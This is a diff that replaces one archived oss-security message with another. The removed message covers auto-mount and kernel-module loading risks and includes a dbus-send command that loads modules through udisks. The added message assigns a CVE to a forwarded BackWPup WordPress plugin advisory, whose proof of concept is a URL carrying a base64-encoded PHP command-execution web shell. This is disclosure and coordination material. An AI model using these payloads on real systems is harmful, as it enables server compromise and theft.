@@ -1,65 +1,90 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/02/23/10
-Message-ID: <20110223073348.GA29003@suse.de>
-Date: Wed, 23 Feb 2011 08:33:48 +0100
-From: Sebastian Krahmer <krahmer@...e.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/11/22/10
+Message-ID: <4ECBFE1F.2050506@redhat.com>
+Date: Tue, 22 Nov 2011 12:55:11 -0700
+From: Kurt Seifried <kseifried@...hat.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: Physical access vulnerabilities and auto-mounting
+CC: Henri Salo <henri@...v.fi>
+Subject: Re: Fwd: Wordpress plugin BackWPup Remote and Local Code Execution Vulnerability - SOS-11-003
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+On 11/22/2011 03:07 AM, Henri Salo wrote:
+> ----- Forwarded message from Lists <lists@...seofsecurity.com.au> -----
+>
+> Date: Mon, 28 Mar 2011 15:10:39 +1100
+> From: Lists <lists@...seofsecurity.com.au>
+> To: lists@...seofsecurity.com.au
+> Subject: [Full-disclosure] Wordpress plugin BackWPup Remote and Local Code
+> 	Execution Vulnerability - SOS-11-003
+> X-Mailer: Microsoft Outlook Express 6.00.3790.4657
+>
+> Sense of Security - Security Advisory - SOS-11-003
+>
+> Release Date.                  28-Mar-2011
+> Last Update.                   -
+> Vendor Notification Date.      25-Mar-2010
+> Product.                       Wordpress Plugin BackWPup
+> Platform.                      Independent
+> Affected versions.             1.6.1 (verified), possibly others
+> Severity Rating.               High
+> Impact.                        System Access
+> Attack Vector.                 Remote without authentication
+> Solution Status.               Upgrade to version 1.7.1
+> CVE reference.                 Not yet assigned
+>
+> Details.
+> A vulnerability has been discovered in the Wordpress plugin BackWPup 
+> 1.6.1 which can be exploited to execute local or remote code on the web 
+> server. The Input passed to the component "wp_xml_export.php" via the 
+> "wpabs" variable allows the inclusion and execution of local or remote 
+> PHP files as long as a "_nonce" value is known. The "_nonce" value 
+> relies on a static constant which is not defined in the script meaning 
+> that it defaults to the value "822728c8d9".
+>
+> Proof of Concept.
+> wp_xml_export.php?_nonce=822728c8d9&wpabs=data://text/plain;base64,PGZ
+> vcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2bIiBtZX           
+> Rob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4Ij48aW5wdXQgdHlwZT0   
+> ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2bPHByZT48PyAKZWNobyBgeyRfUE9TVF
+> sneCddfWA7ID8%2bPC9wcmU%2bPD8gZGllKCk7ID8%2bCgo%3d
+>
+> Solution.
+> Upgrade to version 1.7.1
+>
+> Discovered by.
+> Phil Taylor - Sense of Security Labs.
+>
+> Sense of Security Pty Ltd
+> Level 8, 66 King St
+> Sydney NSW 2000
+> AUSTRALIA
+> T: +61 (0)2 9290 4444
+> F: +61 (0)2 9290 4455
+> W: http://www.senseofsecurity.com.au
+> E: info@...seofsecurity.com.au
+> Twitter: @ITsecurityAU
+>
+> The latest version of this advisory can be found at:
+> http://www.senseofsecurity.com.au/advisories/SOS-11-003.pdf
+>
+> Other Sense of Security advisories can be found at:
+> http://www.senseofsecurity.com.au/research/it-security-advisories.php
+> ----- End forwarded message -----
+>
+> Can we assign CVE-identifier for this issue?
 
-Unfortunally I think nobody would care. As nobody cared
-that you actually do not need physical access. Via udisks DBUS
-service you can load any LKM via
+Please use CVE-2011-4342 for this issue.
 
-dbus-send --system --print-reply --dest=org.freedesktop.UDisks          \
-                   /org/freedesktop/UDisks/devices/sr0                  \
-                   org.freedesktop.UDisks.Device.FilesystemMount        \
-                   string:'LKM' array:string:''
+> Original advisory: http://seclists.org/fulldisclosure/2011/Mar/328 / http://www.senseofsecurity.com.au/advisories/SOS-11-003
+> Fixed in version: 1.7.2 (http://wordpress.org/support/topic/plugin-backwpup-remote-and-local-codeexecution-vulnerability-sos-11-003)
+> OSVDB: http://osvdb.org/show/osvdb/71481
+> http://www.exploit-db.com/exploits/17056/
+>
+> Best regards,
+> Henri Salo
 
-I reported that several months ago to upstream but it was frozen to more
-or less a non-issue. Indeed nobody agreed that this is an issue to fix.
-
-Sebastian
-
-On Tue, Feb 22, 2011 at 11:17:54PM -0500, Dan Rosenberg wrote:
-> I originally started writing this as a response to the recent CVE
-> requests for issues in partition handling, but thought it might be a
-> useful discussion on its own.  I was wondering if there are any
-> clear-cut policies on issues involving physical access, since these
-> can be very difficult in terms of assigning blame.
-> 
-> For example, many Linux distributions will auto-mount filesystems on
-> removable storage, often going so far as to load corresponding kernel
-> modules for filesystems that aren't compiled in or don't already have
-> an LKM loaded.  Sometimes, this will happen even if the screen is
-> locked.
-> 
-> Incidentally, many Linux filesystem implementations don't have
-> especially robust error handling for failures during attempts to mount
-> corrupt filesystems.  As an example, I have a deliberately corrupted
-> btrfs filesystem that triggers a BUG() if you attempt to mount it.  I
-> formatted a USB stick with this filesystem, so now I have a USB stick
-> that will panic the kernels of distributions that support
-> auto-mounting, in some cases even when the screen is locked.
-> 
-> Should this be considered a vulnerability?  Probably.  But what should
-> be fixed?  Should auto-mounting be disabled entirely?  Is it no longer
-> a vulnerability if auto-mounting is disabled only when the screen is
-> locked?  Should all filesystems have graceful error handling for every
-> possible edge case that can occur when dealing with corruption?
-> 
-> I'd be interested to hear opinions on this.  And depending on how the
-> discussion goes, I'd be happy to provide more details on specific
-> cases, such as the btrfs example.
-> 
-> -Dan
 
 -- 
-~
-~ perl self.pl
-~ $_='print"\$_=\47$_\47;eval"';eval
-~ krahmer@...e.de - SuSE Security Team
-~ SUSE LINUX Products GmbH, GF: Markus Rex, HRB 16746 (AG Nuernberg)
+
+-Kurt Seifried / Red Hat Security Response Team
 
